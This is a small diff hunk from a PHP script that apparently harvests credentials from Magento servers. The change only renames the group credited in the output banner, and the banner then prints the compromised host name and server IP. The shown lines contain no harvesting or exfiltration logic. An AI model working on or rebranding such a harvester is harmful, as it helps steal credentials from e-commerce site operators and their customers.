@@ -374,7 +374,7 @@ foreach ($unique_rows as $row) {
 $output = "";
 $output .= str_repeat("=", 60) . "\n";
 $output .= "  MAGENTO CREDENTIAL HARVEST RESULTS\n";
-$output .= "  D1337 SOVEREIGN LABS\n";
+$output .= "  BOB MARLEY LABS\n";
 $output .= str_repeat("=", 60) . "\n\n";
 $output .= "Host: $host_name\n";
 $output .= "IP: $server_ip\n";
